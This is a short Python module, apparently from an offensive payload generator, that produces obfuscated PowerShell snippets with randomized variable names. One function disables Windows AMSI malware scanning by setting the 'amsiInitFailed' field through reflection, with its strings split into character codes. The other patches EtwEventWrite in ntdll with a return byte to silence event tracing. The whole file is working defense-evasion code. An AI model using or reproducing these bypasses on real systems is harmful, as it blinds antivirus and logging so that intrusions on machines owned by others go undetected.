from utils import rand_var


def amsi_bypass():
    v = rand_var()
    v2 = rand_var()
    return f'''try{{
{v}=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils')
{v2}={v}.GetField([char]97+'msiInit'+[char]70+'ailed','NonPublic,Static')
{v2}.SetValue($null,$true)}}catch{{}}
'''


def etw_bypass():
    v = rand_var()
    v2 = rand_var()
    ns = 'K32'
    cls = 'W32'
    return f'''try{{
Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);' -Name {cls} -Namespace {ns} -PassThru|Out-Null
{v}=[{ns}.{cls}]::GetProcAddress([{ns}.{cls}]::LoadLibrary("ntdll.dll"),"EtwEventWrite")
{v2}=0;[{ns}.{cls}]::VirtualProtect({v},[UIntPtr]::new(1),0x40,[ref]{v2})|Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte({v},0xC3)
[{ns}.{cls}]::VirtualProtect({v},[UIntPtr]::new(1),{v2},[ref]{v2})|Out-Null
}}catch{{}}
'''
